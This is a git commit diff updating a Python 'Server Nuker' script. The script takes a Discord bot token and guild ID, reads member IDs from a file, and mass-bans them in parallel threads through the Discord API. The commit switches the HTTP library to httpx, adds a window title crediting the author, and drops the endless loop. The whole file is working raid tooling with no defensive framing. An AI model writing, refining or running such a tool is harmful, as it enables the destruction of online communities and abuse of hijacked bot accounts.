1b2ff13d27a78cf132cd26297df72b3c71bb85ae
villain <91448412+eastsidevillain@users.noreply.github.com>
2021-12-22 07:59:18 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,35 +1,30 @@
 try:
     from concurrent.futures import ThreadPoolExecutor
-    from requests_futures.sessions import FuturesSession
-    import random, time, os
+    import random, time, os, httpx
     from colorama import Fore, Style
 except ImportError:
     print("Error [!] -> Modules Are not installed")
+os.system("cls & mode 80, 23 & title Server Nuker Made By rockstar#0002")
 
+token, guild = input("Token -> "), input("\nGuild ID -> ")
 
-os.system("cls & mode 80, 23")
-
-token, guild = (input("Token -> "), input("Guild ID -> "))
 
 threads = []
 apiv = [6, 7, 8, 9]
 codes = [200, 201, 204]
 
-os.system("cls & mode 80, 23")
-
 
 def worker(user: str):
     try:
-        session = FuturesSession()
-        response = session.put(
+        response = httpx.put(
             "https://discord.com/api/v{}/guilds/{}/bans/{}".format(
                 random.choice(apiv), guild, user, time.sleep(0.050)
             ),
-            headers={"Authorization": "Bot {}".format(token)},
-        ).result()
+            headers={"Authorization": f"Bot {token}"},
+        )
         if response.status_code in codes:
             print(
-                f"{Fore.CYAN}{Style.BRIGHT} Succesfully Punished Member -> {Fore.RESET}"
+                f"{Fore.CYAN}{Style.BRIGHT} Succesfully Punished User --> {Fore.RESET}"
                 + user
             )
         else:
@@ -40,14 +35,13 @@ def worker(user: str):
 
 def theadpool():
     with ThreadPoolExecutor() as executor:
+
         with open("members.txt") as f:
             Ids = f.readlines()
 
         for user in Ids:
-            
             threads.append(executor.submit(worker, user))
 
 
 if __name__ == "__main__":
-    while True:
-        theadpool()
+    theadpool()
